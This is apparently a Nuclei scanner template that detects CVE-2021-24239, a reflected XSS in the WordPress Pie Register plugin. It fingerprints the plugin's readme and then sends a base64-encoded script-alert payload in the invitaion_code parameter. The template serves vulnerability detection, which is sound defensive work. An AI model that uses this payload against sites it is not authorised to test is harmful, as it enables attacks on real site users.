flow: http(1) && http(2)
http:
- matchers:
  - condition: and
    internal: true
    type: word
    words:
    - Pie Register
    - 'Tags:'
  raw:
  - 'GET /wp-content/plugins/pie-register/readme.txt HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, "<script>alert(document.domain);</script>") && contains(body,
      "invitaion-code-table")
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/wp-admin/admin.php?page=pr_new_registration_form&show_dash_widget=1&invitaion_code=PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pOzwvc2NyaXB0Pg=='
id: CVE-2021-24239
info:
  author: r3Y3r53
  classification:
    cpe: cpe:2.3:a:genetechsolutions:pie_register:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2021-24239
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.8887
    epss-score: 0.04595
  description: 'WordPress Pie Register plugin before 3.7.0.1 is susceptible to cross-site
    scripting. The plugin does not sanitize the invitaion_code GET parameter when
    outputting it in the Activation Code page. An attacker can inject arbitrary script
    in the browser of an unsuspecting user in the context of the affected site, which
    can allow the attacker to steal cookie-based authentication credentials and launch
    other attacks.

    '
  impact: 'Successful exploitation of this vulnerability could lead to the execution
    of arbitrary script code in the context of the victim''s browser, potentially
    allowing an attacker to steal sensitive information or perform actions on behalf
    of the victim.

    '
  metadata:
    framework: wordpress
    max-request: 2
    product: pie_register
    vendor: genetechsolutions
    verified: true
  name: WordPress Pie Register <3.7.0.1 - Cross-Site Scripting
  reference:
  - https://wpscan.com/vulnerability/f1b67f40-642f-451e-a67a-b7487918ee34
  - https://plugins.trac.wordpress.org/changeset/2507536/
  - https://nvd.nist.gov/vuln/detail/CVE-2021-24239
  remediation: Fixed in version 3.7.0.1.
  severity: medium
  tags: cve2021,cve,xss,pie-register,wp,wpscan,genetechsolutions,wordpress,vuln
